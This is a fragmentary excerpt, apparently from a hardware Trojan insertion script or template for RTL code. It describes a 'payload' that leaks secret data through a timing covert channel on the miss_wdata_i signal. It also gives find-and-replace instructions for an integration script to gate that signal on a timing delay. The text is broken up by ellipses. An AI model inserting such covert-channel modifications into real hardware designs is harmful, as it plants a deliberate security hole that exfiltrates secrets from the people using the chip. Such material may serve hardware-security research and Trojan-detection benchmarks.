 ...
 * Payload: Modulate timing of miss_wdata_i based on secret data
 * 
...
assign secret_bit = miss_wdata_i[0];
...
// ============================================================
// Covert Channel: Modulate timing of miss_wdata_i
//
// Integration Script Must Modify:
//
// IF miss_wdata_i is timing-sensitive:
//   Find: assign miss_wdata_i = ready_signal;
//   Replace: assign miss_wdata_i = (timing_delay == 0) ? ready_signal : 1'b0;
//
